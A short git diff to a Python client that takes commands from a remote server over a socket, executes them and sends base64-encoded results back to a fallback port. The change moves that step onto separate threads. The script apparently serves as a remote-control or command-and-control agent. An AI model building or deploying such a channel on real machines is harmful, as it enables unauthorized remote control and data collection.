@@ -95,7 +95,13 @@ def execute(mode, line):
         return "Done"
     elif mode == "username":
         return config["client-name"]
-
+def execute_and_fallbackdata(data):
+    res = execute(data[0], base64decode(data[1]))
+    s2 = socket.socket()
+    s2.connect((config["server-address"], int(config["fallback-server-port"])))
+    s2.send(f'''{data[2]}|{base64encode(res)}'''.encode("UTF-8"))
+    print(base64encode(res))
+    s2.close()
 def start_server_connection():
     global s
     s.connect((config["server-address"], int(config["server-port"])))
@@ -103,17 +109,8 @@ def start_server_connection():
         d=s.recv(1024000).decode('UTF-8')
         print(d)
         data=d.split("|")
-        res=execute(data[0], base64decode(data[1]))
-        s2 = socket.socket()
-        s2.connect((config["server-address"], int(config["fallback-server-port"])))
-        s2.send(f'''{data[2]}|{base64encode(res)}'''.encode("UTF-8"))
-        print(base64encode(res))
-        s2.close()
+        Thread(target=execute_and_fallbackdata,args=(data,)).start()
 
 
-def start_input_thread():
-    global s
-    while True:
-        l=input()
 if __name__ == "__main__":
     Thread(target=start_server_connection).start()
